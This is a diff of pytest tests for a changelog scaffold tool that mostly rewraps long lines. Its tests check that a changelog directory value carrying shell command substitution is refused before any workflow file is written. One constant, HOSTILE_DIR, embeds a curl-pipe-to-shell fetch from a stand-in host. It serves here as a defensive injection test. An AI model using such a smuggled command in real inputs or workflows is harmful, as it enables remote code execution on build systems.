@@ -61,7 +61,9 @@ HOSTILE_DIR = "news.d$(curl -s http://evil/x|sh)"
 
 def test_a_changelog_dir_carrying_a_substitution_never_reaches_a_generated_run_line():
     with pytest.raises(scaffold.ScaffoldError) as refusal:
-        scaffold.render_owned(".github/workflows/oss-changelog.yml", _config(changelog_dir=HOSTILE_DIR))
+        scaffold.render_owned(
+            ".github/workflows/oss-changelog.yml", _config(changelog_dir=HOSTILE_DIR)
+        )
     assert "changelog_dir" in str(refusal.value)
 
 
@@ -69,13 +71,19 @@ def test_the_whole_scaffold_refuses_a_changelog_dir_carrying_a_substitution(tmp_
     with pytest.raises(scaffold.ScaffoldError):
         scaffold.plan(tmp_path, _config(changelog_dir=HOSTILE_DIR))
     with pytest.raises(scaffold.ScaffoldError):
-        scaffold.apply(tmp_path, _config(changelog_dir=HOSTILE_DIR), plugin_root=REPO_ROOT)
-    assert not (tmp_path / ".github").exists(), "the scaffold wrote files before refusing"
+        scaffold.apply(
+            tmp_path, _config(changelog_dir=HOSTILE_DIR), plugin_root=REPO_ROOT
+        )
+    assert not (tmp_path / ".github").exists(), (
+        "the scaffold wrote files before refusing"
+    )
 
 
 def test_a_changelog_dir_that_is_not_a_string_is_refused_rather_than_crashing():
     with pytest.raises(scaffold.ScaffoldError):
-        scaffold.render_owned(".github/workflows/oss-changelog.yml", _config(changelog_dir=17))
+        scaffold.render_owned(
+            ".github/workflows/oss-changelog.yml", _config(changelog_dir=17)
+        )
 
 
 def test_a_nested_changelog_directory_still_renders():
@@ -104,7 +112,9 @@ def _workflow_steps():
     file a maintainer reads.
     """
     body = scaffold.render_owned(".github/workflows/oss-changelog.yml", _config())
-    return [line.strip() for line in body.splitlines() if line.strip().startswith("run:")]
+    return [
+        line.strip() for line in body.splitlines() if line.strip().startswith("run:")
+    ]
 
 
 def _guarded_import_roots(path):
@@ -196,14 +206,20 @@ def test_zero_fragments_reach_a_verdict_without_the_parser(tmp_path):
     ]
 
     empty = subprocess.run(
-        command, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        command,
+        env=env,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
         universal_newlines=True,
     )
     assert empty.returncode == 0, empty.stdout
 
     (fragments / "17.fixed.md").write_text("- a fragment (#17).\n", encoding="utf-8")
     carried = subprocess.run(
-        command, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        command,
+        env=env,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
         universal_newlines=True,
     )
     assert carried.returncode != 0, carried.stdout
@@ -274,13 +290,17 @@ def test_every_owned_file_declares_that_it_is_overwritten(tmp_path):
 def test_the_header_tells_you_what_to_do_instead(tmp_path):
     """A prohibition with no alternative gets ignored by whoever needs the change."""
     scaffold.apply(tmp_path, _config())
-    head = (tmp_path / ".github" / "workflows" / "oss-changelog.yml").read_text(encoding="utf-8")
+    head = (tmp_path / ".github" / "workflows" / "oss-changelog.yml").read_text(
+        encoding="utf-8"
+    )
     assert "copy it" in head.lower()
 
 
 def test_the_plan_distinguishes_all_three_contracts(tmp_path):
     (tmp_path / "SECURITY.md").write_text("ours\n", encoding="utf-8")
-    actions = {entry["path"]: entry["action"] for entry in scaffold.plan(tmp_path, _config())}
+    actions = {
+        entry["path"]: entry["action"] for entry in scaffold.plan(tmp_path, _config())
+    }
     assert actions["SECURITY.md"] == "present"
     assert actions["CLAUDE.md"] == "create"
     assert actions[".github/workflows/oss-changelog.yml"] == "replace"
@@ -294,7 +314,9 @@ def test_the_copied_script_is_the_one_the_plugin_ships(tmp_path):
     copied = (tmp_path / scaffold.OWNED_DIR / "assemble_changelog.py").read_text(
         encoding="utf-8"
     )
-    source = (REPO_ROOT / "scripts" / "assemble_changelog.py").read_text(encoding="utf-8")
+    source = (REPO_ROOT / "scripts" / "assemble_changelog.py").read_text(
+        encoding="utf-8"
+    )
     assert source.splitlines()[-1] in copied
     assert "UNTAGGED_RELEASES = frozenset()" in copied
 
